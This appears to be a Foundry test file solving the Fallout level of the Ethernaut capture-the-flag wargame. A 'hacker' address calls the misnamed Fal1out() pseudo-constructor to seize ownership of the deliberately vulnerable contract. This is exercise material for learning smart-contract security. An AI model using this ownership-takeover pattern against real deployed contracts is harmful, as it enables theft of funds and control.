// SPDX-License-Identifier: CC-BY-4.0
// Mia Stein solution to ethernaut

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Fallout} from "src/02/Fallout.sol";

contract FalloutTest is Test {

    Fallout public level = new Fallout();

    address instance = vm.addr(0x10053); 
    address hacker = vm.addr(0x1337); 

    function setUp() public {

        vm.prank(instance);

    }

    function testFallbackHack() public {

        vm.startPrank(hacker);

        level.Fal1out();
        
        vm.stopPrank();
        
    }
}